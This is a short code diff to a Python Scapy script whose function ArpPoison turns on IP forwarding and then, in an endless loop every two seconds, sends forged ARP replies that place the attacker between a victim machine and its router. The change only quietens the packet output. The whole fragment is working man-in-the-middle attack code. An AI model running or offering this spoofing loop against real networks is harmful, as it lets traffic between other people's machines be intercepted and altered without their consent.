@@ -36,12 +36,11 @@ def ArpPoison(victimIP, routerIP, iface):
     victimMAC = getMacAddrFromIP(victimIP)
     hostMAC = getHostMacAddr(iface)
 
-
     os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
 
     while 1:
-        sendp(Ether(src=hostMAC, dst=victimMAC)/ARP(op=2, pdst=victimIP, psrc=routerIP, hwdst=victimMAC))
-        sendp(Ether(src=hostMAC, dst=routerMAC)/ARP(op=2, pdst=routerIP, psrc=victimIP, hwdst=routerMAC))
+        sendp(Ether(src=hostMAC, dst=victimMAC)/ARP(op=2, pdst=victimIP, psrc=routerIP, hwdst=victimMAC), verbose=0)
+        sendp(Ether(src=hostMAC, dst=routerMAC)/ARP(op=2, pdst=routerIP, psrc=victimIP, hwdst=routerMAC), verbose=0)
         sleep(2)
 
 
